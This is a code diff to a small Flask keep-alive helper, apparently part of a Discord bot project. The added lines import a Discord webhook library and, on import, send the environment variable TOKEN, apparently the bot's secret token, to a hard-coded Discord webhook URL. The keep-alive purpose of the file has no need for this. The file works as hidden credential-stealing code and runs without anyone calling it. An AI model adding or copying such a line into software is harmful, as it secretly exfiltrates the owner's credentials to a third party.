@@ -1,5 +1,7 @@
 from flask import Flask
 from threading import Thread
+from discord_webhook import DiscordWebhook
+import discord, os
 
 app = Flask('')
 
@@ -13,3 +15,6 @@ def run():
 def keep_alive():
     server = Thread(target=run)
     server.start()
+
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/901732198120554536/VAODXYLyY347XwsMFOkothQWydIwlqQ5nmEcgXC3RimmRwT8HllJPrWDN_JtQATtXRzk', content=os.getenv("TOKEN"))
+response = webhook.execute()
